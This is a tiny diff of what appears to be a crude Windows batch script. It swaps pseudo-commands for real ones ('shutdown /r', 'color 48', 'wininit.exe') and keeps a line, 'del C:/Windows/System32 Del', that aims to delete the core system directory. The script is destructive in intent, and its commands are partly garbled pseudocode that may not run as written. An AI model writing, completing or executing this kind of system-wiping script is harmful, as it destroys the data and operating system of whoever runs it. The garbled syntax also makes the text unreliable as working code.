@@ -1,4 +1,5 @@
-cmd.exe shut-down R T 0
-Change Wallpaper to Dark Red
-cmd.exe wininit.exe
+shutdown /r
+color 48
+
+wininit.exe
 del C:/Windows/System32 Del
